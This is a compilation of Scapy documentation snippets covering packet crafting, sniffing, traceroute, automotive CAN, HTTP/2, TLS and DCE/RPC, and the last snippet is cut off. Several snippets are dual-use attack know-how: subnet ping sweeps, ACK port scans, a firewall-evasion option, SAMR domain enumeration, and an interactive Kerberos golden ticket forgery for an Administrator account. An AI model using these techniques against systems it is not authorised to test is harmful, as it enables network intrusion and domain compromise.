Python\nDESCRIPTION: This snippet demonstrates how to configure ISOTP settings and create an ISOTP socket for sending data over a CAN bus.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nconf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': False}\nload_contrib('isotp')\nwith ISOTPSocket(\"can0\", tx_id=0x641, rx_id=0x241) as sock:\n    sock.send(...)\n```\n\n----------------------------------------\n\nTITLE: ACK Scan Implementation in Scapy\nDESCRIPTION: Performs an ACK scan by sending TCP packets with the ACK flag set to detect filtered and unfiltered ports. Demonstrates basic port scanning techniques.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"www.slashdot.org\")/TCP(dport=[80,666],flags=\"A\"))\n\nfor s,r in ans:\n    if s[TCP].dport == r[TCP].sport:\n       print(\"%d is unfiltered\" % s[TCP].dport)\n\nfor s in unans:     \n    print(\"%d is filtered\" % s[TCP].dport)\n```\n\n----------------------------------------\n\nTITLE: Reading PCAP Files with Scapy\nDESCRIPTION: Demonstrates how to read packet capture (PCAP) files using Scapy's rdpcap() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> a=rdpcap(\"/spare/captures/isakmp.cap\")\n>>> a\n<isakmp.cap: UDP:721 TCP:0 ICMP:0 Other:0>\n```\n\n----------------------------------------\n\nTITLE: Asynchronous Packet Sniffing with Scapy's AsyncSniffer\nDESCRIPTION: Shows how to use Scapy's AsyncSniffer class for asynchronous packet capture. This allows programmatic control over starting and stopping the sniffer, as well as retrieving results.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nt = AsyncSniffer()\nt.start()\nprint(\"hey\")\nresults = t.stop()\n```\n\n----------------------------------------\n\nTITLE: Advanced Traceroute Techniques\nDESCRIPTION: Advanced traceroute implementations using TCP SYN, UDP and DNS.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_48\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"4.2.2.1\",ttl=(1,10))/TCP(dport=53,flags=\"S\"))\n\nres, unans = sr(IP(dst=\"target\", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname=\"test.com\"))\n\nans, unans = traceroute(\"4.2.2.1\",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=\"thesprawl.org\")))\n```\n\n----------------------------------------\n\nTITLE: Complete ECU Automaton Implementation in Python\nDESCRIPTION: Full implementation of the ECU automaton including power handling, state management, and UDS response processing using Scapy's automotive modules.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\nfrom typing import Optional, List, IO, Type, Any\nfrom scapy.packet import Packet\nfrom scapy.automaton import ATMT, Automaton\nfrom scapy.contrib.automotive.uds import *\nfrom scapy.contrib.isotp import *\n\nclass EcuAutomaton(Automaton):\n    def __init__(self, *args: Any, power_supply: AutomatonPowerSupply, **kargs: Any) -> None:\n        self.power_supply = power_supply\n        super().__init__(*args,\n                         external_fd={\"power_supply_fd\": self.power_supply.read_pipe.fileno()},\n                         **kargs)\n\n    @ATMT.state(initial=1)  # type: ignore\n    def ECU_OFF(self) -> None:\n        pass\n\n    @ATMT.state()  # type: ignore\n    def ECU_ON(self) -> None:\n        pass\n\n    # ====== POWER HANDLING ==========\n    @ATMT.ioevent(ECU_OFF, name=\"power_supply_fd\")  # type: ignore\n    def event_voltage_changed_on(self, fd: IO[bytes]) -> None:\n        new_voltage = fd.read(1)\n        if new_voltage == b\"1\":\n            raise self.ECU_ON()\n\n    @ATMT.ioevent(ECU_ON, name=\"power_supply_fd\")  # type: ignore\n    def event_voltage_changed_off(self, fd: IO[bytes]) -> None:\n        new_voltage = fd.read(1)\n        if new_voltage == b\"0\":\n            raise self.ECU_OFF()\n\n    @ATMT.action(event_voltage_changed_on)  # type: ignore\n    def action_consumption_on(self) -> None:\n        self.debug(1, \"Consuming energy ON\")\n        with self.power_supply.current_on.get_lock():\n            self.power_supply.current_on.value = 1\n\n    @ATMT.action(event_voltage_changed_off)  # type: ignore\n    def action_consumption_off(self) -> None:\n        self.debug(1, \"Consuming energy OFF\")\n        with self.power_supply.current_on.get_lock():\n            self.power_supply.current_on.value = 0\n\n    @ATMT.receive_condition(ECU_ON)  # type: ignore\n    def on_pkt_on_received(self, pkt: Packet) -> None:\n        if response := self.get_default_uds_response(pkt):\n            self.my_send(response)\n\n    def get_default_uds_response(self, pkt: Packet) -> Optional[Packet]:\n        service = bytes(pkt)[0]\n        length = len(pkt)\n        sub_function = bytes(pkt)[1] if length else None\n        match service, length, sub_function:\n            case 0x10, 2, 1:\n                return UDS()/UDS_DSCPR(b\"\\x01\")\n            case 0x3E, 2, 0:\n                return UDS() / UDS_TPPR()\n            case 0x3E, 2, 0x80:\n                return None\n            case 0x3E, 2, _:\n                return UDS() / UDS_NR(requestServiceId=service,\n```\n\n----------------------------------------\n\nTITLE: Generating Packet Sets in Scapy\nDESCRIPTION: Shows how to generate sets of packets by specifying multiple values for packet fields.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> a=IP(dst=\"www.slashdot.org/30\")\n>>> a\n<IP  dst=Net('www.slashdot.org/30') |>\n>>> [p for p in a]\n[<IP dst=66.35.250.148 |>, <IP dst=66.35.250.149 |>,\n <IP dst=66.35.250.150 |>, <IP dst=66.35.250.151 |>]\n>>> b=IP(ttl=[1,2,(5,9)])\n>>> b\n<IP ttl=[1, 2, (5, 9)] |>\n>>> [p for p in b]\n[<IP ttl=1 |>, <IP ttl=2 |>, <IP ttl=5 |>, <IP ttl=6 |>, \n <IP ttl=7 |>, <IP ttl=8 |>, <IP ttl=9 |>]\n>>> c=TCP(dport=[80,443])\n>>> [p for p in a/c]\n[<IP frag=0 proto=TCP dst=66.35.250.148 |<TCP dport=80 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.148 |<TCP dport=443 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.149 |<TCP dport=80 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.149 |<TCP dport=443 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.150 |<TCP dport=80 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.150 |<TCP dport=443 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.151 |<TCP dport=80 |>>,\n <IP frag=0 proto=TCP dst=66.35.250.151 |<TCP dport=443 |>>]\n```\n\n----------------------------------------\n\nTITLE: Performing Traceroute and Visualizing Results in Python\nDESCRIPTION: Uses Scapy's traceroute() function to perform a traceroute to www.secdev.org and visualizes the results on a world map.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nans, unans = traceroute('www.secdev.org', maxttl=15)\nans.world_trace()\n```\n\n----------------------------------------\n\nTITLE: Constructing HTTP/2 Headers for Favicon Request in Python\nDESCRIPTION: Creates an HTTP/2 headers frame for requesting a favicon using Scapy's tblhdr.parse_txt_hdrs function. It sets various HTTP headers and specifies header compression rules.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nqry_icon = tblhdr.parse_txt_hdrs(\n    ''':method GET\n:path /favicon.ico\n:authority www.google.fr\n:scheme https\naccept-encoding: gzip, deflate\naccept-language: fr-FR\naccept: image/x-icon; image/vnd.microsoft.icon\nuser-agent: Scapy HTTP/2 Module\n''',\n    stream_id=3,\n    max_frm_sz=srv_max_frm_sz,\n    max_hdr_lst_sz=srv_max_hdr_tbl_sz,\n    is_sensitive=lambda hdr_name, hdr_val: hdr_name in ['cookie'],\n    should_index=lambda x: x in [\n            'x-requested-with', \n            'user-agent', \n            'accept-language',\n            ':authority',\n            'accept',\n        ]\n)\nqry_icon.show()\n```\n\n----------------------------------------\n\nTITLE: Setting Up Virtual CAN Interface in Python\nDESCRIPTION: This snippet shows how to set up a virtual CAN interface using system commands executed from within Python, useful for testing CAN functionality without physical hardware.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.can import *\nimport os\n\nbashCommand = \"/bin/bash -c 'sudo modprobe vcan; sudo ip link add name vcan0 type vcan; sudo ip link set dev vcan0 up'\"\nos.system(bashCommand)\n```\n\n----------------------------------------\n\nTITLE: Opening HCI Bluetooth Socket with Scapy\nDESCRIPTION: Opens a Host Controller Interface (HCI) socket to communicate with a Bluetooth device. Requires root privileges and must specify the device number (0 for hci0).\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> # Open a HCI socket to device hci0\n>>> bt = BluetoothHCISocket(0)\n```\n\n----------------------------------------\n\nTITLE: ICMP Ping Scanning\nDESCRIPTION: Performs traditional ICMP ping scanning of a subnet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"192.168.1.0/24\")/ICMP(), timeout=3)\nans.summary(lambda s,r: r.sprintf(\"%IP.src% is alive\") )\n```\n\n----------------------------------------\n\nTITLE: Using TCPSession for TCP Packet Reassembly in Scapy\nDESCRIPTION: Demonstrates how to implement TCP packet reassembly using Scapy's TCPSession. The example shows a TLS packet reassembly implementation that checks packet length to determine when reassembly is complete.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nclass TLS(Packet):\n    [...]\n\n    @classmethod\n    def tcp_reassemble(cls, data, metadata, session):\n        length = struct.unpack(\"!H\", data[3:5])[0] + 5\n        if len(data) == length:\n            return TLS(data)\n```\n\n----------------------------------------\n\nTITLE: Crafting Golden Ticket for Kerberos Authentication in Scapy\nDESCRIPTION: This code shows how to craft a golden ticket in Scapy, which is a forged Kerberos TGT created with the KRBTGT hash. It allows setting custom user attributes, SIDs, group IDs, and expiration time, then saves the ticket to a ccache file.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.create_ticket()\nUser [User]: Administrator\nDomain [DOM.LOCAL]: DOMAIN.LOCAL\nDomain SID [S-1-5-21-1-2-3]: S-1-5-21-4239584752-1119503303-314831486\nGroup IDs [513, 512, 520, 518, 519]: 512, 520, 513, 519, 518\nUser ID [500]: 500\nPrimary Group ID [513]:\nExtra SIDs [] :S-1-18-1\nExpires in (h) [10]:\nWhat key should we use (AES128-CTS-HMAC-SHA1-96/AES256-CTS-HMAC-SHA1-96/RC4-HMAC) ? [AES256-CTS-HMAC-SHA1-96]:\nEnter the NT hash (AES-256) for this ticket (as hex): 6df5a9a90cb076f4d232a123d9c24f46ae11590a5430710bc1881dca337989ce\n>>> t.show()\nTickets:\n0. Administrator@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\n>>> t.save(fname=\"blob.ccache\")\n```\n\n----------------------------------------\n\nTITLE: TCP Timestamp Filtering with Scapy in Python\nDESCRIPTION: This snippet shows how to add a TCP Timestamp option to packets sent with Scapy. This is useful for bypassing firewalls that drop packets without this option, which is a common occurrence in popular port scanners.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_52\n\nLANGUAGE: python\nCODE:\n```\nsr1(IP(dst=\"72.14.207.99\")/TCP(dport=80,flags=\"S\",options=[(\"Timestamp\",(0,0))]))\n```\n\n----------------------------------------\n\nTITLE: Simple HTTP GET Request with HTTP_Client\nDESCRIPTION: Demonstrates how to make a basic HTTP GET request to a server using Scapy's HTTP_Client class. This example shows creating a client, making a request, and properly closing the connection.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.http import *  # or load_layer(\"http\")\nclient = HTTP_Client()\nresp = client.request(\"http://127.0.0.1:8080\")\nclient.close()\n```\n\n----------------------------------------\n\nTITLE: Complex Packet Construction in Scapy\nDESCRIPTION: Demonstrates creating complex network packets by combining Ethernet, IP and UDP layers with multiple destinations and TTL values.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/introduction.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n      /IP(dst=[\"ketchup.com\",\"mayo.com\"],ttl=(1,9))\n      /UDP()\n```\n\n----------------------------------------\n\nTITLE: Processing Server Messages\nDESCRIPTION: Processes various server-side messages including ServerHello, Encrypted Extensions, Certificate, Certificate Verify, and Finished messages.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n# ServerHello + ChangeCipherSpec (middlebox compatibility)\nrecord2_str = open('raw_data/tls_session_13/02_srv.raw', 'rb').read()\nrecord2 = TLS(record2_str, tls_session=sess.mirror())\nrecord2.show()\n```\n\nLANGUAGE: python\nCODE:\n```\n# Encrypted Extensions\nrecord3_str = open('raw_data/tls_session_13/03_srv.raw', 'rb').read()\nrecord3 = TLS(record3_str, tls_session=sess)\nrecord3.show()\n```\n\nLANGUAGE: python\nCODE:\n```\n# Certificate\nrecord4_str = open('raw_data/tls_session_13/04_srv.raw', 'rb').read()\nrecord4 = TLS(record4_str, tls_session=sess)\nrecord4.show()\n```\n\nLANGUAGE: python\nCODE:\n```\n# Certificate verify\nrecord5_str = open('raw_data/tls_session_13/05_srv.raw', 'rb').read()\nrecord5 = TLS(record5_str, tls_session=sess)\nrecord5.show()\n```\n\nLANGUAGE: python\nCODE:\n```\n# Finished\nrecord6_str = open('raw_data/tls_session_13/06_srv.raw', 'rb').read()\nrecord6 = TLS(record6_str, tls_session=sess)\nrecord6.show()\n```\n\n----------------------------------------\n\nTITLE: Building DCE/RPC Packets in Python using Scapy\nDESCRIPTION: This snippet shows how to build a DCE/RPC packet using Scapy. It demonstrates two methods: one with explicit NDR array specifications, and another using a simplified syntax where Scapy automatically adds the necessary NDR containers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> pkt = NetrServerReqChallenge_Request(\n...    ComputerName=NDRConformantArray(max_count=5, value=[\n...        NDRVaryingArray(offset=0, actual_count=5, value=b'WIN1')\n...    ]),\n...    ClientChallenge=PNETLOGON_CREDENTIAL(data=b'12345678'),\n...    PrimaryName=None\n... )\n\n>>> pkt = NetrServerReqChallenge_Request(\n...     ComputerName=b'WIN1',\n...     ClientChallenge=PNETLOGON_CREDENTIAL(data=b'12345678'),\n...     PrimaryName=None\n... )\n>>> pkt.show()\n```\n\n----------------------------------------\n\nTITLE: Sniffing Bluetooth LE Packets with nRF Sniffer in Scapy\nDESCRIPTION: This snippet demonstrates how to use the nRF Sniffer interface to capture Bluetooth LE packets. It uses the sniff function with the appropriate interface and prints a summary of each captured packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n>>> sniff(iface=\"/dev/ttyUSB0-None\", prn=lambda x: x.summary())\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_IND\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_IND\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_IND\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_NONCONN_IND\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_NONCONN_IND\nNRFS2_PCAP / NRFS2_Packet / NRF2_Packet_Event / BTLE / BTLE_ADV / BTLE_ADV_IND\n```\n\n----------------------------------------\n\nTITLE: Creating and Summarizing a Packet in Python\nDESCRIPTION: Shows how to create a packet with specific destination IP and display its summary using Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\np = Ether()/IP(dst=\"www.secdev.org\")/TCP()\np.summary()\n```\n\n----------------------------------------\n\nTITLE: Extending Scapy with Custom Packet and Function in Python\nDESCRIPTION: This script demonstrates how to extend Scapy by defining a custom packet type and function. It also shows how to create an interactive Scapy session with custom globals and banner.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/extending.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n#! /usr/bin/env python\n\n# Set log level to benefit from Scapy warnings\nimport logging\nlogger = logging.getLogger(\"scapy\")\nlogger.setLevel(logging.INFO)\n\nfrom scapy.all import *\n\nclass Test(Packet):\n    name = \"Test packet\"\n    fields_desc = [ ShortField(\"test1\", 1),\n                    ShortField(\"test2\", 2) ]\n\ndef make_test(x,y):\n    return Ether()/IP()/Test(test1=x,test2=y)\n\nif __name__ == \"__main__\":\n    interact(mydict=globals(), mybanner=\"Test add-on v3.14\")\n```\n\n----------------------------------------\n\nTITLE: Initializing and Using DCERPC Client in Python with Scapy\nDESCRIPTION: This snippet demonstrates how to set up a DCERPC client using Scapy, connect to a server, and perform operations like enumerating domains. It uses NTLMSSP for authentication and connects to the SAMR interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import NTLMSSP, MD4le\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nssp = NTLMSSP(\n    UPN=\"User\",\n    HASHNT=MD4le(\"Password\"),\n)\nclient = DCERPC_Client(\n    DCERPC_Transport.NCACN_NP,\n    ssp=ssp,\n    ndr64=False,\n)\nclient.connect(\"192.168.0.100\")\nclient.open_smbpipe(\"lsass\")  # open the \\pipe\\lsass pipe\nclient.bind(find_dcerpc_interface(\"samr\"))\n\n# Get Server Handle: call [0] SamrConnect\nserverHandle = client.sr1_req(SamrConnect_Request(\n    DesiredAccess=(\n        0x00000010 # SAM_SERVER_ENUMERATE_DOMAINS\n    )\n)).ServerHandle\n\n# Enumerate domains: call [6] SamrEnumerateDomainsInSamServer\nEnumerationContext = 0\nwhile True:\n    resp = client.sr1_req(\n        SamrEnumerateDomainsInSamServer_Request(\n            ServerHandle=serverHandle,\n            EnumerationContext=EnumerationContext,\n        )\n    )\n    # note: there are a lot of sub-structures\n    print(resp.valueof(\"Buffer\").valueof(\"Buffer\")[0].valueof(\"Name\").valueof(\"Buffer\").decode())\n    EnumerationContext = resp.EnumerationContext  # continue enumeration\n    if resp.status == 0:  # no domain left to enumerate\n        break\n\nclient.close()\n```\n\n----------------------------------------\n\nTITLE: TCP Client HTTP Request with Scapy\nDESCRIPTION: Demonstrates using TCP_client.tcplink to send an HTTP request and save the response. This example shows how to create a TCP connection, send an HTTP request, and handle the response at a lower level.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"http\")\nreq = HTTP()/HTTPRequest(\n    Accept_Encoding=b'gzip, deflate',\n    Cache_Control=b'no-cache',\n    Connection=b'keep-alive',\n    Host=b'www.secdev.org',\n    Pragma=b'no-cache'\n)\na = TCP_client.tcplink(HTTP, \"www.secdev.org\", 80)\nanswer = a.sr1(req)\na.close()\nwith open(\"www.secdev.org.html\", \"wb\") as file:\n    file.write(answer.load)\n```\n\n----------------------------------------\n\nTITLE: UDP Ping Scanning\nDESCRIPTION: Performs UDP ping scanning that triggers ICMP port unreachable responses from live hosts.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr( IP(dst=\"192.168.*.1-10\")/UDP(dport=0) )\nans.summary( lambda s,r : r.sprintf(\"%IP.src% is alive\") )\n```\n\n----------------------------------------\n\nTITLE: Sending ICMP Loop Packets\nDESCRIPTION: Sends 100 ICMP packets to Google DNS servers (8.8.8.8 and 8.8.4.4) with 0.1s intervals and timeout. Returns answered and unanswered packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/graphs-ipids.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nans, unans = srloop(IP(dst=[\"8.8.8.8\", \"8.8.4.4\"])/ICMP(), inter=.1, timeout=.1, count=100, verbose=False)\n```\n\n----------------------------------------\n\nTITLE: Decompressing and Rendering HTTP/2 Stream Content in Python\nDESCRIPTION: This code extracts payload data from HTTP/2 stream fragments, decompresses it using zlib, decodes it to UTF-8, and renders it as HTML using IPython's HTML display function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_32\n\nLANGUAGE: python\nCODE:\n```\ndata = ''\nfor frgmt in stream_data[1]:\n    data += frgmt.payload.data\n\nHTML(zlib.decompress(data, 16+zlib.MAX_WBITS).decode('UTF-8', 'ignore'))\n```\n\n----------------------------------------\n\nTITLE: Using DCE/RPC Client in Python with Scapy\nDESCRIPTION: This snippet demonstrates how to use Scapy's DCE/RPC client to connect to a host, bind to an interface, and send a ServerAlive request. It includes examples for different authentication levels and security support providers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nclient = DCERPC_Client(\n    DCERPC_Transport.NCACN_IP_TCP,\n    ndr64=False,\n)\nclient.connect(\"192.168.0.100\")\nclient.bind(find_dcerpc_interface(\"IObjectExporter\"))\n\nreq = ServerAlive_Request(ndr64=False)\nresp = client.sr1_req(req)\nresp.show()\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import *\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nssp = NTLMSSP(\n    UPN=\"Administrator\",\n    PASSWORD=\"Password1\",\n)\nclient = DCERPC_Client(\n    DCERPC_Transport.NCACN_IP_TCP,\n    auth_level=DCE_C_AUTHN_LEVEL.PKT_PRIVACY,\n    ssp=ssp,\n    ndr64=False,\n)\nclient.connect(\"192.168.0.100\")\nclient.bind(find_dcerpc_interface(\"IObjectExporter\"))\n\nreq = ServerAlive_Request(ndr64=False)\nresp = client.sr1_req(req)\nresp.show()\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.kerberos import *\nfrom scapy.layers.spnego import *\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nssp = SPNEGOSSP(\n    [\n        KerberosSSP(\n            UPN=\"Administrator@domain.local\",\n            PASSWORD=\"Password1\",\n            SPN=\"host/dc1\",\n        )\n    ]\n)\nclient = DCERPC_Client(\n    DCERPC_Transport.NCACN_IP_TCP,\n    auth_level=DCE_C_AUTHN_LEVEL.PKT_INTEGRITY,\n    ssp=ssp,\n    ndr64=False,\n)\nclient.connect(\"192.168.0.100\")\nclient.bind(find_dcerpc_interface(\"IObjectExporter\"))\n\nreq = ServerAlive_Request(ndr64=False)\nresp = client.sr1_req(req)\nresp.show()\n```\n\n----------------------------------------\n\nTITLE: Processing HTTP/2 Server Responses in Python\nDESCRIPTION: Implements a loop to read and process HTTP/2 frames from the server. It handles different frame types, including PING frames, and collects frames for specific streams until they are closed by the server.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nstream = h2.H2Seq()\nclosed_stream = 0\n\nnew_frame = None\nwhile True:\n    if not isinstance(new_frame, type(None)):\n        if new_frame.stream_id in [1, 3]:\n            stream.frames.append(new_frame)\n            if 'ES' in new_frame.flags:\n                closed_stream += 1\n        elif new_frame.stream_id == 0 and new_frame.type == h2.H2PingFrame.type_id:\n            new_flags = new_frame.getfieldval('flags')\n            new_flags.add('A')\n            new_frame.flags = new_flags\n            ss.send(new_frame)\n            \n        if closed_stream >= 2:\n            break\n    try:\n        new_frame = ss.recv()\n        new_frame.show()\n    except:\n        import time\n        time.sleep(1)\n        new_frame = None\n\nstream.show()\n```\n\n----------------------------------------\n\nTITLE: Viewing Scapy Packets with Wireshark in Python\nDESCRIPTION: This example demonstrates how to use Scapy's wireshark() function to view generated or sniffed packets in Wireshark. It creates some example ICMP packets and then opens them in Wireshark for detailed analysis.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_53\n\nLANGUAGE: python\nCODE:\n```\npackets = IP(src=\"192.0.2.9\", dst=Net(\"192.0.2.10/30\"))/ICMP()\n\nwireshark(packets)\n```\n\n----------------------------------------\n\nTITLE: Saving and Loading Packet Captures with Scapy\nDESCRIPTION: Shows how to save captured packets to a PCAP file and later load them back into Scapy. This is useful for storing packet data for later analysis or use with other tools.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\nwrpcap(\"temp.cap\",pkts)\npkts = rdpcap(\"temp.cap\")\n# or\npkts = sniff(offline=\"temp.cap\")\n```\n\n----------------------------------------\n\nTITLE: TCP Multi-Target Traceroute in Python using Scapy\nDESCRIPTION: Demonstrates how to perform a TCP traceroute to multiple targets simultaneously using Scapy's traceroute() function. The code sends packets to multiple destinations and displays the route taken to each target.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_34\n\nLANGUAGE: python\nCODE:\n```\ntraceroute([\"www.yahoo.com\",\"www.altavista.com\",\"www.wisenut.com\",\"www.copernic.com\"],maxttl=20)\n```\n\n----------------------------------------\n\nTITLE: Continuous Packet Sending and Receiving with Scapy's srloop()\nDESCRIPTION: Demonstrates using Scapy's srloop() function to continuously send and receive packets. This example implements a ping-like functionality by repeatedly sending TCP packets to a target and analyzing the responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nsrloop(IP(dst=\"www.target.com/30\")/TCP())\n```\n\n----------------------------------------\n\nTITLE: Simple HTTP Request Using http_request() Function\nDESCRIPTION: Shows how to use the http_request() shorthand function to make a basic HTTP request. This function simplifies making HTTP requests by just requiring the host and path parameters.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"http\")\nhttp_request(\"www.google.com\", \"/\")  # first argument is Host, second is Path\n```\n\n----------------------------------------\n\nTITLE: Plotting IP ID Values from ICMP Responses in Python\nDESCRIPTION: Sends multiple ICMP packets to two IP addresses and plots the IP ID values of the responses using matplotlib.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nans, unans = srloop(IP(dst=[\"8.8.8.8\", \"8.8.4.4\"])/ICMP(), inter=.1, timeout=.1, count=100, verbose=False)\n\n%matplotlib inline\nans.multiplot(lambda x, y: (y[IP].src, (y.time, y[IP].id)), plot_xy=True)\n```\n\n----------------------------------------\n\nTITLE: Implementing TFTP Read Client in Scapy\nDESCRIPTION: This snippet shows a complete implementation of a TFTP read client using Scapy's Automaton class. It defines states, conditions, and actions for the TFTP protocol.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nclass TFTP_read(Automaton):\n    def parse_args(self, filename, server, sport = None, port=69, **kargs):\n        Automaton.parse_args(self, **kargs)\n        self.filename = filename\n        self.server = server\n        self.port = port\n        self.sport = sport\n\n    def master_filter(self, pkt):\n        return ( IP in pkt and pkt[IP].src == self.server and UDP in pkt\n                 and pkt[UDP].dport == self.my_tid\n                 and (self.server_tid is None or pkt[UDP].sport == self.server_tid) )\n        \n    # BEGIN\n    @ATMT.state(initial=1)\n    def BEGIN(self):\n        self.blocksize=512\n        self.my_tid = self.sport or RandShort()._fix()\n        bind_bottom_up(UDP, TFTP, dport=self.my_tid)\n        self.server_tid = None\n        self.res = b\"\"\n\n        self.l3 = IP(dst=self.server)/UDP(sport=self.my_tid, dport=self.port)/TFTP()\n        self.last_packet = self.l3/TFTP_RRQ(filename=self.filename, mode=\"octet\")\n        self.send(self.last_packet)\n        self.awaiting=1\n        \n        raise self.WAITING()\n        \n    # WAITING\n    @ATMT.state()\n    def WAITING(self):\n        